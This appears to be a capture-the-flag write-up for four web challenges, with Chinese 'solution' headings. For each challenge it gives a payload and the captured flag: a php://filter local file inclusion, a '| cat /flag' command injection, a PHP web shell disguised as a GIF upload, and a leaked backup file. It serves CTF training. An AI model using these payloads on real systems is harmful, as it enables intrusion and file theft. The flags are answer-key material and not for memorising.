# Web

## Include

> 题解

1. ?file=php://filter/convert.base64-encode/resource=flag.php

> flag{8555ce60-09a2-4e26-a64a-e9359932fab1}

## Exec

> 题解

1. 127.0.0.1 | cat /flag

> flag{8d255bd7-dedf-4a41-9df6-5c4c7c817495}

## Upload

> 题解

```php
// index.phtml
GIF89a
<script language='php'>system('cat /flag');</script>
```

> flag{80f14e81-9253-49ef-b539-e9b16a6c2ca6}

## BackupFile

> 题解

1. /index.php.bak
2. ?key=123

> flag{7e45d358-9d5c-4e91-ad13-57c502e6ed45}